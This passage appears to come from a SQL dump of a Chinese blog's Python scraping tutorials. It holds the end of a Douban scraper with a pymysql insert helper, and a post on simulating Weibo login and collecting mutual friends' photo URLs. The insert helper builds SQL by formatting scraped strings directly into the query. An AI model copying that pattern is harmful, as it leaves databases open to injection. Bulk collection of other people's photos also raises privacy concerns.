nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),&quot;页面&quot;,x,&quot;抓取失败，原因&quot;,e)</code></pre><p>上面的sys.stdout = f_handler是将print内容写入到这个out.log文件中，这里我注释了...</p><p>page.txt（初始化写个0就行）是记录这个事情爬到第几页的，如果出错可以读取文件继续往后爬</p><h3>mysql.py的代码</h3><pre><code class=\"language-css\">import&nbsp;pymysql\r\nimport&nbsp;time\r\n\r\nclass&nbsp;tomysql:\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.db&nbsp;=&nbsp;pymysql.connect(host=&#39;localhost&#39;,user=&#39;root&#39;,passwd=&#39;****&#39;,db=&#39;python&#39;,port=3306,charset=&#39;utf8&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.cur&nbsp;=&nbsp;self.db.cursor()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;pymysql.Error&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;链接数据库错误，原因%d:%s&quot;&nbsp;%&nbsp;(e.args[0],e.arg[1]))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getCurrentTime(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;time.strftime(&#39;[%Y-%m-%d&nbsp;%H:%M:%S]&#39;,time.localtime(time.time()))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;insertData(self,table,D_dict):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,my_dict&nbsp;in&nbsp;enumerate(D_dict):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;my_dict:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;k==0:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;keys&nbsp;=&nbsp;&#39;,&#39;.join(my_dict.keys())\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values&nbsp;=&nbsp;&#39;&quot;,&quot;&#39;.join(my_dict.values())\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql&nbsp;=&nbsp;&quot;INSERT&nbsp;INTO&nbsp;%s&nbsp;(%s)&nbsp;VALUES&nbsp;(%s)&quot;&nbsp;%&nbsp;(table,&nbsp;keys,&nbsp;&#39;&quot;&#39;+values+&#39;&quot;&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;values&nbsp;=&nbsp;&#39;&quot;,&quot;&#39;.join(my_dict.values())\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql&nbsp;+=&nbsp;&quot;,(%s)&quot;&nbsp;%&nbsp;(&#39;&quot;&#39;+values+&#39;&quot;&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;self.cur.execute(sql)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;insert_id&nbsp;=&nbsp;self.db.insert_id()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.db.commit()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;result:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;insert_id\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;pymysql.Error&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.db.rollback()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;key&nbsp;&#39;PRIMARY&#39;&quot;&nbsp;in&nbsp;e.args[1]:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;数据已经存在了，未插入&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;插入数据失败，原因&nbsp;%d:&nbsp;%s&quot;&nbsp;%&nbsp;(e.args[0],&nbsp;e.args[1]))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;pymysql.Error&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(self.getCurrentTime(),u&quot;数据库返回错误，原因%d:&nbsp;%s&quot;&nbsp;%&nbsp;(e.args[0],&nbsp;e.args[1]))</code></pre><p>python3好像不能用Mysqldb了所以我用的是pymysql，好像性能都差不多吧，出于性能考虑，我这里是一次性添加一个页面所有链接的数据</p><p>下面是数据库</p><pre><code class=\"language-css\">CREATE&nbsp;TABLE&nbsp;`doubansj`&nbsp;(\r\n&nbsp;&nbsp;`id`&nbsp;int(11)&nbsp;unsigned&nbsp;NOT&nbsp;NULL&nbsp;AUTO_INCREMENT,\r\n&nbsp;&nbsp;`title`&nbsp;varchar(64)&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;`author`&nbsp;varchar(32)&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;`datatime`&nbsp;varchar(32)&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;`tagclass`&nbsp;varchar(16)&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;`content`&nbsp;text&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;`description`&nbsp;varchar(256)&nbsp;NOT&nbsp;NULL,\r\n&nbsp;&nbsp;PRIMARY&nbsp;KEY&nbsp;(`id`)\r\n)&nbsp;ENGINE=MyISAM&nbsp;DEFAULT&nbsp;CHARSET=utf8;</code></pre><p><br/></p><h3>采集成果</h3><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456883705342480.png@base@tag=imgScale&q=100&w=690\" style=\"\" title=\"1456883705342480.png\"/></p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1456883708621578.png@base@tag=imgScale&q=100&w=690\" style=\"\" title=\"1456883708621578.png\"/></p><p><br/></p>',1456826469,'2016-11-02 13:53:26','0000-00-00 00:00:00',4,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/image_1456883650734015.jpg?imageView2/1/w/210/h/140'),(123,0,'python','一只特立独行的猪2号','Python爬虫日记之爬取微博互粉好友的照片','作为资深的微博控，我终于要爬微博了，当然，单纯爬文字就太简单了，所以我就选择爬取互粉好友的照片。爬取主要有这两个难点，一来微博登录这里各种安全参数和谜一样的加密，好在这步网上有现成的资料。第二个难点就是踏马的图片是js动态加载的，鬼畜了一点，不过还是有办法的。','爬取微博互粉好友的照片','利用python的爬虫去采集微博互粉好友的照片，只需要输入帐号密码即可完成采集','爬虫，微博，照片','爬虫日记',273,'<p><img style=\"border-radius:4px\" src=\"http://lzxya.kssws.ks-cdn.com/image_1457504413350313.jpg@base@tag=imgScale&q=100&w=690\" title=\"1457504413350313.jpg\" alt=\"7.jpg\"/></p><p>我发现我现在每次浏览一个网站都要潜意识的点开源代码看看这个网站该怎么爬，不得不说这是病啊ORZ。</p><p>So，作为资深的微博控，我终于要爬微博了，当然，单纯爬文字就太简单了，所以我就选择爬取互粉好友的照片。讲真，这个过程还是挺复杂的，主要有这两个难点，一来微博登录这里各种安全参数和谜一样的加密，好在这步网上有现成的资料~。其实这里的过程应该学学人家淘宝嘛一个ua就行了。第二个难点就是踏马的图片是js动态加载的，鬼畜了一点，不过还是有办法的，就是要好好的观察一下图片的加载来源就行，然后截取参数，组合图片url就行，慢慢上步骤！</p><h2>登录步骤</h2><p>登录的话，模拟登录成功后就把cookie保存到一个文件里面去，这样下次就能直接利用cookie访问了。</p><pre><code class=\"language-css\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取登录用参数，需要微博帐号\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getLoginGet(self,user):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginUrl&nbsp;=&nbsp;&#39;http://login.sina.com.cn/sso/prelogin.php?entry=weibo&amp;callback=sinaSSOController.preloginCallBack&amp;su=%s&amp;rsakt=mod&amp;checkpin=1&amp;client=ssologin.js(v1.4.15)&amp;_=1400822309846&#39;&nbsp;%&nbsp;user\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginPage&nbsp;=&nbsp;self.getPage(loginUrl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&quot;servertime&quot;:(.*?),&quot;.*?&quot;nonce&quot;:&quot;(.*?)&quot;,&quot;pubkey&quot;:&quot;(.*?)&quot;,&quot;rsakv&quot;:&quot;(.*?)&quot;,.*?exectime&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resultPage&nbsp;=&nbsp;re.search(pattern,loginPage)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;servertime&#39;]&nbsp;=&nbsp;resultPage.group(1)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;nonce&#39;]&nbsp;=&nbsp;resultPage.group(2)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;pubkey&#39;]&nbsp;=&nbsp;resultPage.group(3)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;rsakv&#39;]&nbsp;=&nbsp;resultPage.group(4)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#user为帐号，pwd为密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;loginWeibo(self,user,pwd):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取登录要用到的参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getLoginGet(user)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#微博加密方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;=&nbsp;base64.b64encode(bytes(request.quote(user)&nbsp;,&nbsp;encoding&nbsp;=&nbsp;&#39;utf-8&#39;))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsaPublickey&nbsp;=&nbsp;int(self.resultGet[&#39;pubkey&#39;]&nbsp;,&nbsp;16)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;=&nbsp;rsa.PublicKey(rsaPublickey&nbsp;,&nbsp;65537)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message&nbsp;=&nbsp;bytes(str(self.resultGet[&#39;servertime&#39;])&nbsp;+&nbsp;&#39;\\t&#39;&nbsp;+&nbsp;str(self.resultGet[&#39;nonce&#39;])&nbsp;+&nbsp;&#39;\\n&#39;&nbsp;+&nbsp;str(pwd)&nbsp;,&nbsp;encoding&nbsp;=&nbsp;&#39;utf-8&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp&nbsp;=&nbsp;binascii.b2a_hex(rsa.encrypt(message&nbsp;,&nbsp;key))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#最后带过去的参数...\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;param&nbsp;=&nbsp;{&#39;entry&#39;&nbsp;:&nbsp;&#39;weibo&#39;&nbsp;,&nbsp;&#39;gateway&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;from&#39;&nbsp;:&nbsp;&#39;&#39;&nbsp;,&nbsp;&#39;savestate&#39;&nbsp;:&nbsp;7&nbsp;,&nbsp;&#39;useticket&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;pagerefer&#39;&nbsp;:&nbsp;&#39;http://login.sina.com.cn/sso/logout.php?entry=miniblog&amp;r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D&#39;&nbsp;,&nbsp;&#39;vsnf&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;su&#39;&nbsp;:&nbsp;su&nbsp;,&nbsp;&#39;service&#39;&nbsp;:&nbsp;&#39;miniblog&#39;&nbsp;,&nbsp;&#39;servertime&#39;&nbsp;:&nbsp;self.resultGet[&#39;servertime&#39;]&nbsp;,&nbsp;&#39;nonce&#39;&nbsp;:&nbsp;self.resultGet[&#39;nonce&#39;]&nbsp;,&nbsp;&#39;pwencode&#39;&nbsp;:&nbsp;&#39;rsa2&#39;&nbsp;,&nbsp;&#39;rsakv&#39;&nbsp;:&nbsp;self.resultGet[&#39;rsakv&#39;]&nbsp;,&nbsp;&#39;sp&#39;&nbsp;:&nbsp;sp&nbsp;,&nbsp;&#39;sr&#39;&nbsp;:&nbsp;&#39;1680*1050&#39;&nbsp;,&nbsp;&#39;encoding&#39;&nbsp;:&nbsp;&#39;UTF-8&#39;&nbsp;,&nbsp;&#39;prelt&#39;&nbsp;:&nbsp;961&nbsp;,&nbsp;&#39;url&#39;&nbsp;:&nbsp;&#39;http://weibo.com/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&#39;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#登录，这里得到的是登录跳转页面，需取出里面的登录链接\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginGo&nbsp;=&nbsp;self.postPage(&#39;http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.4.15)&#39;,param)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;urlPage&nbsp;=&nbsp;re.findall(&quot;location.replace\\(\\&#39;(.*?)\\&#39;\\);&quot;&nbsp;,&nbsp;loginGo)[0]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#到这步才完成登录\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getPage(urlPage)</code></pre><p>到这里微博就成功登录了，而且还会保存一个cookie文件，下次访问就能直接利用cookie然后再访问</p><h2>爬取图片链接</h2><p>这里往下主要有如下步骤：</p><p>利用设置页面获取自己的微博id--&gt;</p><p>利用自己的id组合出好友圈的url然后获取页面--&gt;</p><p>分析Html爬取里面的好友微博id（这里好多反斜杠，所以没有直接爬链接）--&gt;</p><p>根据获取的id组合成好友的页面url--&gt;</p><p>再爬取好友的主页--&gt;</p><p>分析Html然后获取到一个page_id（访问最后相册的关键参数）。</p><pre><code class=\"language-css\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取好友圈的全部url\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPageFriends(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取自己的微博id\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageU&nbsp;=&nbsp;self.getPage(&#39;http://account.weibo.com/set/index&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FindUid&nbsp;=&nbsp;re.findall(&#39;&lt;a&nbsp;target=.*?href=&quot;http://weibo.com/(.*?)/info&#39;,pageU)[0]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#好友圈页面\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPage(&#39;http://weibo.com/&#39;+str(FindUid)+&#39;/relation/friends&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;a&nbsp;action-type=.*?href=(.*?)from=myfollow_friends.*?&gt;&lt;img&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;[&#39;http://weibo.com&#39;+self.ToolContent(item)&nbsp;for&nbsp;item&nbsp;in&nbsp;re.findall(pattern,page)]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;你的微博共有&quot;,len(items),u&quot;个互粉好友&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#items就是所有好友的微博首页链接\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;items:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getOneFriend(item)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getOneFriend(self,url):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageFriend&nbsp;=&nbsp;self.getPage(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getMkName(pageFriend)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在采集&quot;,self.mkName,u&quot;的照片...&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这里就是获取page_id的地方\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;a&nbsp;&nbsp;bpfilter=.*?href=.*?p(.*?)/home&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,pageFriend)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;result.group(1):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;纳尼（惊讶脸）&quot;,self.mkName,u&quot;的采集出错了，用getOneFriend重新采集吧&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item&nbsp;=&nbsp;re.sub(&#39;/&#39;,&quot;&quot;,result.group(1))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#为何要组成这个链接呢，看下图\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;photoUrl&nbsp;=&nbsp;&quot;http://photo.weibo.com/page/waterfall?ajwvr=6&amp;filter=wbphoto%7C%7C%7Cv6&amp;page=1&amp;count=20&amp;module_id=profile_photo&amp;oid=&quot;+self.ToolContent(item)+&quot;&amp;uid=&amp;lastMid=&amp;lang=zh-cn&amp;_t=1&amp;callback=STK_14574892696449&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这里就已经得到了一个页面的图片链接，下一步就可以直接保存这些图片了。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getWbimages(photoUrl)</code></pre><p>根据这个页面分析这个图集的链接，到后面就可以自己组合链接访问不同的微博用户的相册了！<br/></p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1457503663640580.png@base@tag=imgScale&q=100&w=690\" title=\"1457503663640580.png\" alt=\"0.png\"/></p><h2>完整代码</h2><pre><code class=\"language-css\">#&nbsp;-*-&nbsp;coding:utf-8&nbsp;-*-\r\nfrom&nbsp;urllib&nbsp;import&nbsp;request,&nbsp;parse\r\nimport&nbsp;re,http.cookiejar,base64,binascii,rsa,os\r\n\r\nclass&nbsp;paweibo:\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#保存cookie的文件名\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.filename&nbsp;=&nbsp;&quot;cookie_wb.txt&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#创建MozillaCookieJar实例对象\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.cookie&nbsp;=&nbsp;http.cookiejar.MozillaCookieJar(self.filename)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#利用urllib2的build_opener方法创建一个opener\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.opener&nbsp;=&nbsp;request.build_opener(request.HTTPCookieProcessor(self.cookie))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#保存登录参数\r\n&nbsp;&nbsp;&nbsp